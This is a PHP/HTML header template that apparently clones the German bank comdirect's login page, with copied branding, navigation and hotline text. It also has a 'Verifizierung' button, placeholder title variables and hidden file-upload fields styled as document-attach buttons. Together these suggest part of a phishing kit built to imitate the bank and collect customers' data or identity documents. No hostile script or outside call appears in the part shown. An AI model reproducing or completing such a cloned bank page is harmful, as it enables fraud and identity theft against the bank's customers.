<!DOCTYPE html>
<html lang="de">

<head>
	<meta charset="utf-8" />
	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
	<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
	<title><?=$appTitle;?> - <?=$this_Title;?></title>
	<link rel="preload" href="assets/fonts/MarkWeb-latin-regular.woff2?v=1673609518560" as="font" crossorigin>
	<link rel="preload" href="assets/fonts/MarkWeb-latin-medium.woff2?v=1673609518560" as="font" crossorigin>
	<link rel="preload" href="assets/fonts/MarkWeb-latin-bold.woff2?v=1673609518560" as="font" crossorigin>
	<link rel="stylesheet" href="assets/css/styleguide-comdirect.css?v=1673609518560" type="text/css" />
	<link rel="stylesheet" href="assets/css/forms.css" type="text/css" /> 
	<link rel="shortcut icon" href="assets/images/favicon_196px.png?v=1673609518560">
	<style>
	.floating-input__label {
		position: absolute;
		bottom: 2.2rem !important;
		left: 0.5625rem;
		transition: none!important;
		transform-origin: none!important;
		pointer-events: none;
		color: #0b1e25;
		white-space: nowrap;
		font-weight: 650 !important;
	}

	.floating-input__input:focus + .floating-input__label,
	.floating-input__label--floated {
		transform: none;
		font-weight:400;
		color: #878e91;
	}

	#file1 {
		display: none!important;
	}
	
	.custom-file1 {
		border: 1px solid #ccc;
		display: inline-block;
		padding: 6px 12px;
		cursor: pointer;
	}

	#file2 {
		display: none;
	}
	
	.custom-file2 {
		border: 1px solid #ccc;
		display: inline-block;
		padding: 6px 12px;
		cursor: pointer;
	}

	.image-upload1 > input {
		display: none;
	}
	
	.attach-doc1 {
		border: 0.5px solid #eee;
		background-color: #fff500;
		color: #0b1e25;
		display: inline-block;
		padding: 6px 12px;
		cursor: pointer;
		border-radius:35px;
	}

	.image-upload2 > input {
		display: none;
	}
	
	.attach-doc2 {
		border: 1px solid #0b1e25;
		background-color: #fff500;
		color: #0b1e25;
		display: inline-block;
		padding: 6px 12px;
		cursor: pointer;
	}

	.floating-input__input::placeholder {
		color:#000;
		font-size: 12px;
	}
	
	button.optionsButton {
		background-color: #fff500;
		border: 1px solid #0b1e25;
		color: #0b1e25;
		padding:15px 15px 15px 15px;
		border-radius:15px;
	}
	</style>

	</head>

<body class="cif-scope-body " data-plugin="{topframechecker:{},unobtrusivefocus:{enabled:false},cobrowsing:{unbluScript:'/unblu/static/js/xmd27924162/xpi0/com.unblu.client.snippet',cookieName:'x-unblu-recorder-session'},keepalive:{url:'/cp/keepalive',onError:'stop',interval:300},ecrm:{pageHierarchy:'comdirect Login',id:'cori0004'}}" data-dataLayer="{&quot;page&quot;:{&quot;pageHierarchy&quot;:&quot;comdirect Login&quot;,&quot;id&quot;:&quot;cori0004&quot;,&quot;status&quot;:200},&quot;steuerung&quot;:{&quot;surferTrack&quot;:true}}">
	<div itemscope itemtype="https://schema.org/WebSite" class="hidden-all">
		<meta itemprop="logo" content="assets/images/comdirect-logo-lg-1x.jpg" />
</div>
	<noscript>
		<div id="noscript" style="padding:20px; background-color: #DEDEDE;">
			<p style="color:#DE0000;font-size: 1.1em;"> In Ihrem Browser ist JavaScript deaktiviert. Die Nutzung der comdirect-Website ist ohne JavaScript nicht m&ouml;glich.
				<br /> Sollten Sie weiterhin Probleme mit dem Zugriff auf die Seite haben, wenden Sie sich bitte w&auml;hrend unserer Servicezeiten an unsere Hotline unter der Rufnummer 04106 - 708 25 10. </p>
		</div>
	</noscript>

	<div class="cif-scope" data-domain=".comdirect.de" data-version="?v=1673609518560">
		<div class="header-background "></div>
		<header class="start-header header-container ">
			<input type="checkbox" id="burger-icon--trigger" class="burger-icon--trigger" />
			<section class="header__section">
				<a href="#" class=" header__logo--mobile header__logo--mobile-background">
					<svg enable-background="new 0 0 62 73" viewBox="0 0 62 73" width="62px" height="73px" xmlns="http://www.w3.org/2000/svg">
						<path d="m62 10.6c-6.6-6.5-15.6-10.6-25.7-10.6-20 0-36.3 16.3-36.3 36.3s16.3 36.3 36.3 36.3c10 0 19.1-4.1 25.7-10.6l-11.2-11.2c-3.7 3.7-8.8 6-14.5 6-11.3 0-20.5-9.2-20.5-20.5s9.2-20.5 20.5-20.5c5.7 0 10.8 2.3 14.5 6z" fill="currentColor" />
					</svg>
				</a>
				<a href="#" class="header__logo header__logo--background">
					<svg xmlns="http://www.w3.org/2000/svg" width="124px" height="21px" viewBox="48.478 103.112 152.304 24">
						<path fill="#0B1E25" d="M56.978 110.6c-5.144 0-8.5 3.556-8.5 8.256 0 4.701 3.356 8.257 8.5 8.257 2.412 0 4.571-.853 6.039-2.508l-2.175-2.359c-1.029.935-2.412 1.638-3.963 1.638-2.715 0-4.772-2.062-4.772-5.027s2.058-5.03 4.772-5.03c1.551 0 2.75.591 3.878 1.622l2.26-2.343c-1.434-1.655-3.627-2.506-6.039-2.506zm16.495 0c-4.993 0-8.686 3.556-8.686 8.256 0 4.701 3.693 8.257 8.686 8.257 4.992 0 8.703-3.557 8.703-8.257-.001-4.703-3.711-8.256-8.703-8.256zm0 3.226c2.884 0 5.077 2.065 5.077 5.029 0 2.966-2.193 5.028-5.077 5.028-2.885 0-5.059-2.062-5.059-5.028-.001-2.963 2.174-5.029 5.059-5.029zm28.547-3.191c-2.108 0-3.585.752-4.748 1.812-.969-1.035-2.18-1.812-4.264-1.812-1.5 0-2.882.8-3.56 1.505v-1.152h-3.584v15.715h3.584v-11.315c.63-.729 1.599-1.411 3.077-1.411 2.132 0 3.099 1.787 3.099 4.211v8.516h3.585v-11.315c.678-.729 1.453-1.411 2.81-1.411 2.446 0 3.366 1.787 3.366 4.211v8.516h3.585v-8.021c.001-4.779-2.009-8.049-6.95-8.049m18.121-.035c-4.52 0-8.079 3.457-8.079 8.256 0 4.801 3.56 8.257 8.079 8.257 2.293 0 3.963-.902 5.076-2.293v1.883h3.524v-23.59h-3.524v9.797c-1.113-1.393-2.783-2.31-5.076-2.31zm.421 3.226c2.919 0 4.874 2.162 4.874 5.029s-1.956 5.028-4.874 5.028c-3.036 0-4.873-2.277-4.873-5.028-.001-2.751 1.836-5.029 4.873-5.029zm16.579-2.817h-3.542v15.693h3.542v-15.693zm13.037-.409c-1.974 0-3.627.688-4.688 2.179v-1.77h-3.491v15.693h3.525v-8.634c0-2.67 1.601-4.209 3.844-4.209.862 0 1.941.196 2.682.573l.844-3.391c-.811-.311-1.637-.441-2.716-.441zm11.839 0c-4.756 0-8.045 3.342-8.045 8.256 0 4.98 3.425 8.257 8.265 8.257 2.444 0 4.672-.573 6.645-2.212l-1.754-2.442c-1.332 1.033-3.053 1.655-4.673 1.655-2.293 0-4.333-1.179-4.807-3.997h11.943c.032-.394.065-.835.065-1.278-.016-4.899-3.119-8.239-7.639-8.239zm-.068 3.046c2.243 0 3.711 1.425 4.098 3.865h-8.382c.372-2.292 1.772-3.865 4.284-3.865zm18.739-3.046c-5.146 0-8.502 3.556-8.502 8.256 0 4.701 3.356 8.257 8.502 8.257 2.411 0 4.57-.853 6.037-2.508l-2.176-2.359c-1.028.935-2.411 1.638-3.963 1.638-2.715 0-4.773-2.062-4.773-5.027s2.058-5.03 4.773-5.03c1.552 0 2.75.591 3.878 1.622l2.261-2.343c-1.434-1.655-3.625-2.506-6.037-2.506zm9.333 10.419c0 4.177 2.142 6.094 5.801 6.094 2.023 0 3.659-.704 4.959-1.557l-1.4-2.735c-.962.59-2.159 1.063-3.254 1.063-1.417 0-2.564-.817-2.564-2.931v-6.832h6.189v-3.113h-6.189v-4.75h-3.541v14.761z" />
					</svg>
				</a>
				<section class="header__search">
					<div class="grid grid--no-gutter grid--middle">
						<div class="col-2"></div>
						<div class="col-10 flex-layout flex-layout__justify-content--end flex-layout__align-items--center">
						</div>
					</div>
				</section>
				<div class="header__mobile--navigation-wrapper">
					<a href="/" class="header__mobile__logo">
						<svg enable-background="new 0 0 62 73" viewBox="0 0 62 73" width="62px" height="73px" xmlns="http://www.w3.org/2000/svg">
							<path d="m62 10.6c-6.6-6.5-15.6-10.6-25.7-10.6-20 0-36.3 16.3-36.3 36.3s16.3 36.3 36.3 36.3c10 0 19.1-4.1 25.7-10.6l-11.2-11.2c-3.7 3.7-8.8 6-14.5 6-11.3 0-20.5-9.2-20.5-20.5s9.2-20.5 20.5-20.5c5.7 0 10.8 2.3 14.5 6z" fill="currentColor" />
						</svg>
					</a>
					
					<a class="button button--primary button--small button--primary button__login" href="#"> <span class="button__inner">Verifizierung</span> </a>
	
				</div>
			</section>
			<nav>
				<div class="navigation--mobile">
					<div class="navigation--mobile__head">
						<!--<div class="navigation--mobile__search" data-plugin="{ mobileSearch: {} }">
							<div class="header-searchfield">
								<form action="#" id="search_form--mobile">
									<input type="text" class="header-searchfield__input" placeholder="WKN, ISIN, Name" title="Wertpapiersuche" autocomplete="off" name="SEARCH_VALUE" />
									<a href="#" data-plugin="{commandlink:{event:'click', form: '#search_form--mobile', ignoreUnbind:true }}"> <span class="icon icon--cd_search-16 icon--size-16">
                              <svg class="icon__svg">
                                <use xlink:href="assets/fonts/svg-symbol.svg#cd_search-16"></use>
                              </svg>
                            </span> </a>
								</form>
							</div>
							<div class="header-searchfield" data-plugin="{inputSearch: {additionalUrlParams: 'from=comdirect_topnavi'}, inputAutocompletion: {showResultInTooltip: false, resultElement: 'results-suche-mobile',resultElementClass: 'navigation--mobile__search-results-inner',additionalUrlParams: 'from=comdirect_topnavi'}}">
								<form action="" id="search-volltext-form--mobile">
									<input type="text" maxlength="256" class="header-searchfield__input" autocomplete="off" placeholder="Volltextsuche" data-role="search-input" spellcheck="false" />
									<a href="#" id="topSearchButton--mobile" data-role="search-trigger"> <span class="icon icon--cd_search-16 icon--size-16">
                                  <svg class="icon__svg">
                                    <use xlink:href="assets/fonts/svg-symbol.svg#cd_search-16"></use>
                                  </svg>
                                </span> </a>
								</form>
							</div> <span class="icon icon--close-x header-searchfield__close-button">
                      <svg class="icon__svg">
                        <use xlink:href="assets/fonts/svg-symbol.svg#close-x"></use>
                      </svg>
                    </span> </div>-->
						<!--<div class="navigation--mobile__search-results">
							<div id="results-suche-mobile" class="navigation--mobile__search-results-inner"></div>
						</div>-->
					</div>

					<ul class="navigation__list navigation__list--level-1" data-plugin="{navigationLoader: {}, navigateWithTabKey: {}, toggleClassByAttributeValue:{source:'#llLink'}}">
						<li class="navigation__item navigation__item--level-1 navigation__item--desktop-first "> <a data-plugin="{at:{pageId:'coai0827'}}" href="#" target=""> Pers&ouml;nlicher Bereich </a>
							<div class="hidden-lg navigation__plusicon navigation__plusicon--logged-out-hidden "> </div>
						</li>
						<li class="navigation__sublevel" data-fetch-url="//www.comdirect.de/cp/navigation/Persoenlicherbereich1"></li>
						<li class="navigation__item navigation__item--level-1 "> <a data-plugin="{at:{pageId:'coai0828'}}" href="#" target=""> Informer </a>
							<div class="hidden-lg navigation__plusicon "> </div>
						</li>
						<li class="navigation__sublevel" data-fetch-url="//www.comdirect.de/cp/navigation/Informer1"></li>
						<li class="navigation__item navigation__item--level-1 "> <a data-plugin="{at:{pageId:'coai2868'}}" href="#" target=""> Girokonto </a>
							<div class="hidden-lg navigation__plusicon "> </div>
						</li>
						<li class="navigation__sublevel" data-fetch-url="//www.comdirect.de/cp/navigation/Konto1"></li>
						<li class="navigation__item navigation__item--level-1 "> <a data-plugin="{at:{pageId:'coai2870'}}" href="#" target=""> Geldanlage </a>
							<div class="hidden-lg navigation__plusicon "> </div>
						</li>
						<li class="navigation__sublevel" data-fetch-url="//www.comdirect.de/cp/navigation/Geldanlage1"></li>
						<li class="navigation__item navigation__item--level-1 "> <a data-plugin="{at:{pageId:'coai2871'}}" href="#" target=""> Depot </a>
							<div class="hidden-lg navigation__plusicon "> </div>
						</li>
						<li class="navigation__sublevel" data-fetch-url="#"></li>
						<li class="navigation__item navigation__item--level-1 "> <a data-plugin="{at:{pageId:'coai2872'}}" href="#" target=""> Wertpapierhandel </a>
							<div class="hidden-lg navigation__plusicon "> </div>
						</li>
						<li class="navigation__sublevel" data-fetch-url="#"></li>
						<li class="navigation__item navigation__item--level-1 "> <a data-plugin="{at:{pageId:'coai2869'}}" href="#" target=""> Kredite </a>
							<div class="hidden-lg navigation__plusicon "> </div>
						</li>
						<li class="navigation__sublevel" data-fetch-url="#"></li>
						<li class="navigation__item navigation__item--level-1 navigation__item--desktop-last "> <a data-plugin="{at:{pageId:'coai0829'}}" href="#" target=""> Hilfe & Service </a>
							<div class="hidden-lg navigation__plusicon "> </div>
						</li>
						<li class="navigation__sublevel" data-fetch-url="#"></li>
						<li class="navigation__item navigation__item--level-1 hidden-lg "> <a data-plugin="" href="#" target=""> &Uuml;ber uns </a>
							<div class="hidden-lg navigation__plusicon "> </div>
						</li>
						<li class="navigation__sublevel" data-fetch-url="#"></li>
						<li class="navigation__impulse visible-lg"></li>
					</ul>
					<div class="hidden-lg">
					</div>
				</div>
			</nav>
		</header>
	</div>